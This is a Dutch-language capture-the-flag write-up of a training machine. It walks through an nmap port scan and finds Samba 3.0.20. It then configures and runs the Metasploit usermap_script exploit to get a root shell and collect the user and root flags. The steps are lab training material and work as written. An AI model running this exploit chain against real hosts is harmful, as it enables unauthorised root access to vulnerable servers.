
Als eerst gaan we gaan scannen voor het zien of er poorten openstaan waarop dat we eventueel binnen zullen kunnen geraken of niet. Dit zullen we doen aan de hand van het volgende commando:

```
nmap -p- -sCV 10.129.206.11 -vvvv
```

We kunnen binnen dit commando ook -Pn gaan meegeven maar dit is alleen als de scan een fout aangeeft dat de poorten eventueel niet gescaned zullen kunnen worden.

![image-20240805-194127.png](26443779.png)

Ik ben eens gaan kijken welke poorten er openstonden en waar er eventueel belangrijke informatie bij stond waardoor ik kan weten of ik op die poort kan gaan binnen breken.

Ik heb gezien dat volgende services open stonden:

- ftp
    
    - ![image-20240805-194633.png](26443789.png)
        
- ssh
    
    - Samba version smbd 3.0.20-Debian
        

Aan de hand van de samba version ben ik gaan zoeken of er geen exploit te vinden was voor die versie van Samba.

De exploit dat ik gevonden heb voor de gevonden versioe van Samba staat hieronder:

![image-20240805-194930.png](26542085.png)

Voor het hacken van de machine kunnen we 2 manieren gaan gebruiken:

- **Manueel**
    

Aan de hand van de manuele exploiting kunnen we gaan binnen geraken op de smb machine. De manuele manier voor binnen te geraken op de machine is door gebruik te maken van de exploit die we hierboven hebben opgezocht.

Voor deze exploit uittevoeren zullen we volgende aspecten:

- RHOST: Dit is het target ip address
    
- LHOST: Dit is je eigen ip address dat je mee moet geven, zodat we de connectie met de machine kunnen maken via onze eigen machine
    
- LPORT: Dit is de poort die we zullen gaan gebruiken voor de connectie opstand te kunnen brengen
    

![image-20240805-195617.png](26509321.png)


## Exploit application

De application dat ik heb gebruikt voor het exploiten van mijn target is **Metasploit Console.** Via deze manier heb ik gemakkelijk een exploit uitgevoerd op mijn target door het volgende te doen.

Als eerst zullen we het pad moeten zetten van waar dat hij de exploit file zal moeten halen. Dit zullen we gaan doen aan de hand van het volgende commando:

use exploit/multi/samba/usermap_script

![image-20240805-200005.png](26509328.png)

 Dan zullen we de RHOST moeten meegeven. Dit zullen we doen aan de hand van het volgende commando:
    
```
set RHOSTS 10.129.206.11
```

![[Pasted image 20250122152214.png]]

We zullen ook ons eigen IP address moeten meegeven zodat we de connectie to stand zouden kunnen laten komen. Dit zullen we doen aan de hand van het volgende commando:    

```
set LHOST 10.10.14.112
```

![[Pasted image 20250122152328.png]]

Eens dat al deze stappen voltooid zijn kunnen we de exploit gaan uitvoeren door het volgende commando te gebruiken.

## exploit

![image-20240805-200600.png](26476570.png)

Hierboven kunnen we zien dat er een connectie tot stand is gekomen. Als we nu id gaan gebruiken als command kunnen we zien welke rechten we hebben op de machine.

![[Pasted image 20250122152358.png]]

Nu dat we als root rechten geconnecteerd zijn aan de machine, Kunnen wegaan zoeken naar de nodige flags.

De user.txt flag heb ik gevonden in het volgende path. Dit path heb ik gevonden door het uitvoeren van het volgende commando:

```
find / -name 'user.txt'
```

![image-20240805-200955.png](26509339.png)

dit is de eerste flag van de machine.

![image-20240805-201028.png](26476584.png)

De tweede flag heb ik gevonden in het path **“/root“.** De tweede flag was het volgende:

![image-20240805-201139.png](26443802.png)

Nu dat ik beide flags heb gevonden is deze machine gehacked.

